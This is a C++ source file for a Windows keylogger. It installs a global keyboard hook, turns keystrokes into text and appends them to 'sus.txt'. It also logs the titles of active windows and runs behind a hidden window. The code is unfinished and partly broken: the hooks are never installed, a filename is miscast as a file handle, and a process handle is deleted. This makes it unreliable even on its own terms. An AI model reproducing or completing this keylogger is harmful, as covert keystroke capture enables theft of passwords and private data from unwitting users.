#include <Windows.h>
#include <string>
#include <format>

#define maxChars 255


bool _isCapsLock;
bool _isNumLock;
bool _isScrollLock;
bool _isShift;
HFILE file;
LPCSTR _filename = "sus.txt";

/*private*/ static void SetKeysState()
{
	_isCapsLock = GetKeyState(VK_CAPITAL) != 0;
	_isNumLock = GetKeyState(VK_NUMLOCK) != 0;
	_isScrollLock = GetKeyState(VK_SCROLL) != 0;
	_isShift = GetKeyState(VK_SHIFT) != 0;
}

LPDWORD AppendTextToFile(LPCSTR file, std::string buffer)
{
	LPDWORD written = 0;
	WriteFile((HANDLE)file, (LPCVOID)buffer.c_str(), buffer.size(), written, NULL);
	return written;
}

/*private*/ static std::string GetSymbol(UINT vkCode)
{
	LPWSTR pwszBuff = new WCHAR[maxChars];
	CONST BYTE* lpKeyState = new byte[maxChars];
	HKL keyboard = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), 0));
	ToUnicodeEx(vkCode, 0, lpKeyState, pwszBuff, maxChars, 0, keyboard);

	std::wstring ws = (pwszBuff);
	std::string buffSymbol = std::string(ws.begin(), ws.end());

	std::string symbol = wcscmp(pwszBuff, L"\r") ? "\n" : buffSymbol;
	if (_isCapsLock ^ _isShift)
	{
		for (int i = 0; i < symbol.length(); i++)
		{
			symbol[i] = toupper(symbol[i]);
		}
	}
	return symbol;
}

//HookProc — это заполнитель для имени, определяемого приложением.
LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	// process event
	if (nCode >= 0 && wParam == WM_KEYUP) {
		int vkCode = lParam;
		SetKeysState();
		std::string saveText = GetSymbol(vkCode);
		//TODO: File Append 
		AppendTextToFile(_filename, saveText);
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}



HHOOK SetHook(int typeOfHook, HOOKPROC lpfn)
{
	WH_KEYBOARD;
	HANDLE curProc = GetCurrentProcess();
	__try {
		return SetWindowsHookEx(typeOfHook, lpfn, NULL, 0);
	}
	__finally {
		delete(curProc);
	}
}

HWINEVENTHOOK SetWinHook(WINEVENTPROC callBack)
{
	WH_KEYBOARD;
	HANDLE curProc = GetCurrentProcess();
	__try {
		return SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, 0, callBack, 0, 0, WINEVENT_OUTOFCONTEXT);
	}
	__finally {
		delete(curProc);
	}
}

LPWSTR GetActiveWindowTitle()
{
	LPWSTR wnd_title = new WCHAR[maxChars];
	HWND hwnd = GetForegroundWindow(); // get handle of currently active window
	GetWindowText(hwnd, wnd_title, sizeof(wnd_title));
	return wnd_title;
}

/*internal*/ static void ActiveWindowsHook(HWINEVENTHOOK hWinEventHook, UINT eventType, HANDLE hWnd, int idObject, int idChild, UINT dwEventThread, UINT dwmsEventTime)
{
	//std::FILE.AppendAllTExt
	//TODO: FILE APPEND
	char str[maxChars];
	sprintf_s(str, "%s %s %s", "\n", (char*) GetActiveWindowTitle(), "\n");
	AppendTextToFile(_filename, str);
}
	
void GetFile()
{
	file = OpenFile(_filename, NULL, OF_EXIST | OF_READWRITE);
	if (file == HFILE_ERROR)
	{
		file = OpenFile(_filename, NULL, OF_READWRITE | OF_CREATE);
	}
	else
	{
		file = OpenFile(_filename, NULL, OF_READWRITE);
	}
}

LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)

{
	switch (uMsg)
	{
	case WM_CLOSE:
		DestroyWindow(hWnd);
		break;


	default:
		return DefWindowProc(hWnd, uMsg, wParam, lParam);
	}

	return 0;
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR pCmdLine, int nCmdShow)
{
	const wchar_t ClassName[] = L"HiddenWindow";
	WNDCLASS wc = {};

	wc.lpfnWndProc = WindowProc;
	wc.hInstance = hInstance;
	wc.lpszClassName = ClassName;

	RegisterClass(&wc);

	HWND hWnd = CreateWindowExW(0, ClassName, L"HiddenWnd", 0, 0, 0, 0, 0, 0, 0, hInstance, 0);

	if (hWnd == NULL) {
		return 0;
	}

	ShowWindow(hWnd, SW_HIDE);

	MSG msg = {};
	while (GetMessage(&msg, NULL, 0, 0)) {
		//DispatchMessage(&msg);
	}

	return 0;
}
